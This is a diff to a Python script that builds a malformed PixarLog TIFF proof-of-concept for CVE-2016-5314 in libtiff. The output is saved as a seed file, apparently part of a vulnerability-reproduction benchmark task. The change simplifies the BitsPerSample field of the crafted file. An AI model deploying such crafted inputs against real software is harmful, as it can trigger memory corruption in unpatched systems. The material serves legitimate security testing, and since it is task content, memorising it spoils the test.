@@ -30,8 +30,7 @@ def build_poc():
     ]
     
     # IFD offset placeholders are fixed below once we know exact layout
-    bits_offset = 134
-    strip_offsets_offset = bits_offset + 12  # 3*4 bytes for bits
+    strip_offsets_offset = 134
     strip_bytecounts_offset = strip_offsets_offset + num_strips * 4
     payload_offset = strip_bytecounts_offset + num_strips * 4
 
@@ -39,7 +38,7 @@ def build_poc():
         (254, 4, 1, 0),             # NewSubfileType: 0
         (256, 3, 1, 10),            # ImageWidth: 10
         (257, 3, 1, 10),            # ImageLength: 10
-        (258, 3, 3, bits_offset),   # BitsPerSample: offset to [8,8,8]
+        (258, 3, 1, 8),             # BitsPerSample: 8 (all samples)
         (259, 3, 1, 32909),         # Compression: PIXARLOG
         (262, 3, 1, 2),             # PhotometricInterpretation: RGB
         (273, 4, num_strips, strip_offsets_offset),
@@ -53,12 +52,11 @@ def build_poc():
         ifd += struct.pack("<HHII", tag, dtype, count, val)
     ifd += struct.pack("<I", 0)
 
-    bits_data = struct.pack("<III", 8, 8, 8)
     strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
     strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
     payload_data = zlib_payload * num_strips
 
-    return header + ifd + bits_data + strip_offsets_data + strip_bytecounts_data + payload_data
+    return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data
 
 output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))
 
